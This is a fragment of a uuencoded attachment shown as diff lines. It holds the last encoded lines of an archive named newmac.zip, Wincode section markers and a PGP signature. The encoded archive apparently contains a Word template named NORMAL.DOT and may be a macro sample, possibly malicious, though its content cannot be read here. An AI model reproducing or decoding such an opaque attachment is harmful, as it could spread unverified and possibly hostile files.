+MG/]_D:L/YWAX7Z+9;+*&'CW_[Y,_1+/Y_R*N?B><Q]E#D^#G:3;_[QLW'WY3
+M_M^O/YPC#R'K9M%-+2/)O_V07]U_9"=J9RR>.DY]+/O^GAPO`L:[C_]1_C\`
+M[<^+.'!:?(_._XF^__]QX*])34%WY?U_@6]X>$.K"9]=<?!?(03@TR+^T`HT
+M#>[,N_0V=X_<$;O'>(N8_^[A3S_`&/DO4$L!`A0`%``"``@`2:O)(++.9$8^
+M#````#````H````````````@`````````$Y/4DU!3"Y$3U102P4&``````$`
+,`0`X````9@P`````
+`
+end
+sum -r/size 27428/3252
+
+section 1/1   file newmac.zip   [ Wincode 2.6.6 ]
+- ---------------------------------------------------------------
+
+-----BEGIN PGP SIGNATURE-----
+Version: 2.6.3ia
+Charset: cp850
+Comment: Reviewed by Editor
+
+iQB1AwUBMU7WX5UWxCqisaIxAQFcPwMAl+j6FZX0thbVO7lZHxscfXda31k31Q4r
+UpW7AxEooSYdBaWfm0P3bVbFu0phMmaXUUPml0p2cGBPBDIfXnMdOGii8C0TvZK7
+b0sqqMe1Cz5fIBRJxj7DRBTEkNU9ddPO
+=I/7Z
+-----END PGP SIGNATURE-----
